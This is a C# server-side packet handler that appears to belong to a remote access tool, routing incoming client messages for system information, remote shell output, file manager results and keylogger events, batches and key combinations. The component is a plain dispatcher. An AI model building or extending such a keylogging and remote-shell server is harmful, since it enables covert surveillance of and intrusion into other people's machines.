using System;
using Common.Enums;
using Common.Networking;
using Common.Utils;

namespace Server.Networking
{
    public sealed class PacketHandler
    {
        private readonly Action<SystemInfoResponse> _onSystemInfoResponse;
        private readonly Action<RemoteShellResponse> _onRemoteShellResponse;
        private readonly Action<FileManagerResponse> _onFileManagerResponse;
        private readonly Action<KeyLoggerEvent>? _onKeyLoggerEvent;
        private readonly Action<KeyLoggerBatch>? _onKeyLoggerBatch;
        private readonly Action<KeyLoggerComboEvent>? _onKeyLoggerComboEvent;

        public PacketHandler(Action<SystemInfoResponse> onSystemInfoResponse, Action<RemoteShellResponse> onRemoteShellResponse, Action<FileManagerResponse> onFileManagerResponse, Action<KeyLoggerEvent>? onKeyLoggerEvent = null, Action<KeyLoggerBatch>? onKeyLoggerBatch = null, Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null)
        {
            _onSystemInfoResponse = onSystemInfoResponse;
            _onRemoteShellResponse = onRemoteShellResponse;
            _onFileManagerResponse = onFileManagerResponse;
            _onKeyLoggerEvent = onKeyLoggerEvent;
            _onKeyLoggerBatch = onKeyLoggerBatch;
            _onKeyLoggerComboEvent = onKeyLoggerComboEvent;
        }

        public void HandleLine(string json)
        {
            try
            {
                var baseObj = JsonHelper.Deserialize<BasePacket>(json);
                if (baseObj == null) return;
                switch (baseObj.PacketType)
                {
                    case PacketType.SystemInfoResponse:
                        var resp = JsonHelper.Deserialize<SystemInfoResponse>(json);
                        if (resp != null)
                        {
                            _onSystemInfoResponse(resp);
                        }
                        break;

                    case PacketType.RemoteShellResponse:
                        var shellResp = JsonHelper.Deserialize<RemoteShellResponse>(json);
                        if (shellResp != null)
                        {
                            _onRemoteShellResponse(shellResp);
                        }
                        break;

                    case PacketType.FileManagerResponse:
                        var fileResp = JsonHelper.Deserialize<FileManagerResponse>(json);
                        if (fileResp != null)
                        {
                            _onFileManagerResponse(fileResp);
                        }
                        break;

                    case PacketType.KeyLoggerEvent:
                        var klEvt = JsonHelper.Deserialize<KeyLoggerEvent>(json);
                        if (klEvt != null && _onKeyLoggerEvent != null) _onKeyLoggerEvent(klEvt);
                        break;

                    case PacketType.KeyLoggerBatch:
                        var klBatch = JsonHelper.Deserialize<KeyLoggerBatch>(json);
                        if (klBatch != null && _onKeyLoggerBatch != null) _onKeyLoggerBatch(klBatch);
                        break;

                    case PacketType.KeyLoggerComboEvent:
                        var klCombo = JsonHelper.Deserialize<KeyLoggerComboEvent>(json);
                        if (klCombo != null && _onKeyLoggerComboEvent != null) _onKeyLoggerComboEvent(klCombo);
                        break;

                    default:
                        break;
                }
            }
            catch (Exception)
            {
                // swallow or log
            }
        }
    }
}


